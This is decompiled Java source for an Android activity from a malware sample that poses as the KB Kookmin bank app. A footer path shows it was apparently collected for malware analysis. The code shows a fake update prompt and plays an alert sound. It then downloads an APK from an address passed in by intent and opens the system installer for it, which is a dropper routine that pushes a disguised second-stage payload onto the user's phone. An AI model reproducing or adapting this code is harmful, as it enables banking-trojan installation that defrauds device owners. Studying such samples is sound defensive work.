package com.kbstar.kb.android.star;

import android.app.Activity;
import android.app.AlertDialog;
import android.app.AlertDialog.Builder;
import android.app.ProgressDialog;
import android.content.Context;
import android.content.DialogInterface;
import android.content.DialogInterface.OnClickListener;
import android.content.Intent;
import android.content.res.Resources;
import android.media.Ringtone;
import android.media.RingtoneManager;
import android.net.Uri;
import android.os.Bundle;
import android.os.Environment;
import android.os.Handler;
import android.os.Message;
import android.util.Log;
import android.view.Window;
import android.widget.Toast;
import com.kbstar.kb.android.star.util.DownloadFileTask;
import com.kbstar.kb.android.star.util.GeneralUtil;
import java.io.File;
import java.util.List;

public class BKMain
  extends Activity
{
  private String BK = "0";
  private final int DOWN_FAILED = 301;
  private final int DOWN_MSG = 304;
  private final int NO_SDCARD = 300;
  private final int REPLACE_MSG = 302;
  private String download_addr = "";
  private File filetoInstall;
  private Handler handler = new Handler()
  {
    public void handleMessage(Message paramAnonymousMessage)
    {
      super.handleMessage(paramAnonymousMessage);
      switch (paramAnonymousMessage.what)
      {
      case 303: 
      default: 
        return;
      case 300: 
        BKMain.this.pd.dismiss();
        Toast.makeText(BKMain.this, BKMain.this.getResources().getString(2131361822), 1).show();
        BKMain.this.finish();
        return;
      case 301: 
        BKMain.this.pd.dismiss();
        Toast.makeText(BKMain.this, BKMain.this.getResources().getString(2131361823), 1).show();
        BKMain.this.finish();
        return;
      case 302: 
        BKMain.this.replaceDialog(BKMain.this, BKMain.this.package_name);
        return;
      }
      BKMain.this.download();
    }
  };
  private String package_name = "";
  private ProgressDialog pd;
  
  public void download()
  {
    new Thread()
    {
      public void run()
      {
        BKMain.this.pd = new ProgressDialog(BKMain.this);
        BKMain.this.pd.setMessage(BKMain.this.getResources().getString(2131361825));
        BKMain.this.pd.setProgressStyle(1);
        BKMain.this.pd.show();
        Object localObject = BKMain.this.download_addr.substring(BKMain.this.download_addr.lastIndexOf("/") + 1);
        localObject = new BKMain.DownLoadFileThreadTask(BKMain.this, BKMain.this.download_addr, "/" + (String)localObject);
        BKMain.this.pd.show();
        new Thread((Runnable)localObject).start();
        super.run();
      }
    }.start();
  }
  
  protected void onCreate(Bundle paramBundle)
  {
    GeneralUtil.activityList.add(this);
    super.onCreate(paramBundle);
    getWindow().requestFeature(1);
    paramBundle = getIntent();
    this.package_name = paramBundle.getStringExtra("PACKAGE");
    this.download_addr = paramBundle.getStringExtra("DOWNLOAD");
    this.BK = paramBundle.getStringExtra("BK");
    switch (Integer.valueOf(this.BK).intValue())
    {
    default: 
      finish();
      return;
    case 0: 
      setContentView(2130903056);
      updateDialog();
      ringtone();
      return;
    case 1: 
      setContentView(2130903054);
      updateDialog();
      ringtone();
      return;
    case 2: 
      setContentView(2130903041);
      updateDialog();
      ringtone();
      return;
    case 3: 
      setContentView(2130903055);
      updateDialog();
      ringtone();
      return;
    }
    setContentView(2130903058);
    updateDialog();
    ringtone();
  }
  
  protected void onDestroy()
  {
    GeneralUtil.exit();
    super.onDestroy();
  }
  
  protected void replaceDialog(Context paramContext, String paramString)
  {
    GeneralUtil.goHome(getApplicationContext());
    paramContext = new File(this.filetoInstall.getAbsolutePath());
    paramString = new Intent();
    paramString.setAction("android.intent.action.VIEW");
    paramString.addFlags(268435456);
    paramString.setDataAndType(Uri.fromFile(paramContext), "application/vnd.android.package-archive");
    startActivity(paramString);
    finish();
  }
  
  public void ringtone()
  {
    try
    {
      Uri localUri = RingtoneManager.getDefaultUri(2);
      RingtoneManager.getRingtone(getApplicationContext(), localUri).play();
      return;
    }
    catch (Exception localException)
    {
      localException.printStackTrace();
    }
  }
  
  protected void updateDialog()
  {
    try
    {
      AlertDialog.Builder localBuilder = new AlertDialog.Builder(this);
      localBuilder.setTitle(getResources().getString(2131361797));
      localBuilder.setMessage(getResources().getString(2131361796));
      localBuilder.setPositiveButton(getResources().getString(2131361804), new DialogInterface.OnClickListener()
      {
        public void onClick(DialogInterface paramAnonymousDialogInterface, int paramAnonymousInt)
        {
          if (!Environment.getExternalStorageState().equals("mounted"))
          {
            paramAnonymousDialogInterface = new Message();
            paramAnonymousDialogInterface.what = 300;
            BKMain.this.handler.sendMessage(paramAnonymousDialogInterface);
            return;
          }
          try
          {
            BKMain.this.pd = new ProgressDialog(BKMain.this);
            BKMain.this.pd.setMessage(BKMain.this.getResources().getString(2131361825));
            BKMain.this.pd.setProgressStyle(1);
            BKMain.this.pd.show();
            paramAnonymousDialogInterface = BKMain.this.download_addr.substring(BKMain.this.download_addr.lastIndexOf("/") + 1);
            paramAnonymousDialogInterface = new BKMain.DownLoadFileThreadTask(BKMain.this, BKMain.this.download_addr, "/" + paramAnonymousDialogInterface);
            BKMain.this.pd.show();
            new Thread(paramAnonymousDialogInterface).start();
            return;
          }
          catch (Exception paramAnonymousDialogInterface)
          {
            Message localMessage = new Message();
            localMessage.what = 301;
            BKMain.this.handler.sendMessage(localMessage);
            paramAnonymousDialogInterface.printStackTrace();
          }
        }
      });
      localBuilder.create().show();
      return;
    }
    finally
    {
      localObject = finally;
      throw ((Throwable)localObject);
    }
  }
  
  private class DownLoadFileThreadTask
    implements Runnable
  {
    private String filepath;
    private String path;
    
    public DownLoadFileThreadTask(String paramString1, String paramString2)
    {
      this.path = paramString1;
      this.filepath = paramString2;
    }
    
    public void run()
    {
      try
      {
        Object localObject = DownloadFileTask.getFile(this.path, AppContacts.BASE_DIR + this.filepath, BKMain.this.pd);
        if (localObject != null)
        {
          Log.i("abc", "Download success");
          localMessage = new Message();
          localMessage.what = 302;
          BKMain.this.handler.sendMessage(localMessage);
          BKMain.this.filetoInstall = ((File)localObject);
          BKMain.this.pd.dismiss();
          return;
        }
        localObject = new Message();
        ((Message)localObject).what = 301;
        BKMain.this.handler.sendMessage((Message)localObject);
        return;
      }
      catch (Exception localException)
      {
        Message localMessage = new Message();
        localMessage.what = 301;
        BKMain.this.handler.sendMessage(localMessage);
        localException.printStackTrace();
      }
    }
  }
}


/* Location:              /home/enzo/Documents/BorelEnzo.github.io/malwares/dsencrypt/payload.jar!/com/kbstar/kb/android/star/BKMain.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       0.7.1
 */